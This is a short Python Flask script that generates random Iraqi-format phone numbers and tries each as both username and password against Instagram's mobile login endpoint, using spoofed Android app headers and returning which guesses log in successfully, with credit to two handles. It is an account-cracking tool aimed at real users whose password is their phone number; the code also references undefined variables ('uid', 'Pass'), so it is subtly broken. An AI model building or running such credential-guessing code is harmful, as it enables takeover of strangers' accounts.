import flask
from flask import jsonify
import requests
from uuid import uuid4
import random
app=flask.Flask(__name__)
@app.route("/api/Kaero/")
def Home():
    get = "1234567890"
    con = ['77','78','78','79','75']
    uio = ['1','2','3','4']
    rand = str("".join(random.choice(get) for x in range(7)))
    uio2 = random.choice(uio)
    con2 = random.choice(con)
    user = '964'+con2+uio2+rand
    Pess = '0'+con2+uio2+rand
    url = 'https://i.instagram.com/api/v1/accounts/login/'
    headers = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            'Accept': "*/*",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com'
        }
    data = {
            'uuid': uid,
            'password': Pass,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'
    }
    rex = requests.post(url,headers=headers,data=data)
    if "logged_in_user" in rex.json():
        return jsonify(result="Ok",user=user,password=Pess,by="@Kaero7 and @eccee8")
    else:
        return jsonify(result="false",user=user,password=Pess,by="@Kaero7 and @eccee8")


app.run()
